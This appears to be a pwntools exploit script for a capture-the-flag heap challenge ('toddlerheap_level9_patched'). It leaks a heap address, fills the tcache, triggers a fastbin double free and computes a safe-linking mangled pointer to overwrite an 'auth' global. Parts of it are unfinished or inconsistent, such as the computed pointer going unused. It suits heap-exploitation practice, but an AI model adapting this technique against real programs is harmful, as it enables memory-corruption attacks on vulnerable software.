from pwn import * 

binary = './toddlerheap_level9_patched'
p = process(binary)
s = '''
b malloc
b free
'''

auth = 0x00404260
p.sendline("malloc 0 24")
p.sendline("free 0")
p.sendline("malloc 0 24")
p.sendline("puts 0")

p.recvuntil("Data: ", drop = True)
heap_leak = int.from_bytes(p.recvline().strip(), 'little')

p.sendline("free 0")
heap_leak = heap_leak << 12
chunk_addr = heap_leak + 0x370


for i in range(0, 7):
	p.sendline(f"malloc {i} 24")
p.sendline("malloc 7 24")
p.sendline("malloc 8 24")
p.sendline("malloc 9 24")
for i in range(0, 7):
	p.sendline(f"free {i}")


p.sendline("free 7")
p.sendline("free 8")
p.sendline("free 7")


print(hex(heap_leak))
for i in range(1, 7):
	p.sendline(f"malloc {i} 24")
	


mangled_ptr = ((chunk_addr >> 12) ^ auth)

p.sendline("malloc 9 24") # idk what this is

gdb.attach(p, s)
p.sendline("malloc 7 24")
p.sendline("malloc 7 24")
p.sendline("malloc 8 24")
p.sendline("safer_read 7")
p.sendline(p64(auth))


p.interactive()
